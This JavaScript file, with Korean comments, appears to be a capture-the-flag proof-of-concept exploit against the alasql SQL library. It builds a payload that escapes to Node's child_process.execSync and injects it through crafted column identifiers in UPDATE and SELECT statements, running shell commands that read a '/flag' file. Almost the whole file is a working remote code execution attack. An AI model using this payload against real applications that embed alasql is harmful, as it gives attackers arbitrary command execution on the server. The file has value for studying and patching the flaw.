const alasql = require('alasql');

// genPayload 함수 정의
const genPayload = command => `
new Function(
    'return this.process.mainModule.require'
)()('child_process').execSync(${JSON.stringify(command)})
`;

// SQL 쿼리 정의 및 실행
const sqlQuery = `
    CREATE table i_am_a_table;
    INSERT INTO i_am_a_table VALUES (1337);

    -- 악의적인 코드 실행 예시들 (주의)
    UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(/flag)")}+']=42;
    SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(/flag)")}+'];
    SELECT \`'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(/flag)")}+'\` from i_am_a_table where 1;
    SELECT [whatever||${genPayload('>&2 echo calling function pwned')}||]('whatever');
`;

// 초기 SQL 쿼리를 실행하여 테이블을 생성하고 데이터를 삽입합니다.
alasql(sqlQuery);

// getFlag 함수 정의, 여기서 테이블에서 값을 조회하여 반환합니다.
alasql.fn.getFlag = function() {
    // 쿼리를 실행하여 i_am_a_table의 데이터를 가져옴
    const result = alasql('SELECT * FROM i_am_a_table');
    return result; // 결과 반환
};

// getFlag 함수를 호출하여 결과 확인
const result = alasql.fn.getFlag();
console.log(result);
